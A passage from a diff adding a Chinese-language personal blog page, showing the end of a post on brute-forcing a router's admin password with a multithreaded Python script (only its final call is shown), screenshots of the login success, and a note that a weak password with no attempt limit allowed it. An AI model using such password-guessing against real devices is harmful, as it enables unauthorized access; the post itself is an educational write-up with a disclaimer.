class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    job_start(<span class="string">&quot;passwords.txt&quot;</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+
+<p>默认读取<code>passwords.txt</code>里的密码，默认线程数 10，爆破结果：</p>
+<p><img src="/image/post/2023/03/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png" alt="密码爆破成功"></p>
+<p>来到后台：</p>
+<p><img src="/image/post/2023/03/%E8%BF%9B%E5%85%A5%E4%B8%BB%E9%A1%B5%E9%9D%A2.png" alt="进入主页面"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次能成功还是因为路由后台的弱口令，并且没有次数的限制</p>
+<blockquote>
+<p>以上内容仅供学习参考，请遵照网络安全法合理使用，如果使用者使用以上脚本等内容出现任何非法攻击等违法行为，与作者无关</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag"># 杂项</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/22/MoeCTF-2022-Web-Wp/" rel="prev" title="MoeCTF 2022 Web Wp">
+                  <i class="fa fa-angle-left"></i> MoeCTF 2022 Web Wp
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/05/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%92%8C%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B/" rel="next" title="Java 类加载器和双亲委派模型">
+                  Java 类加载器和双亲委派模型 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
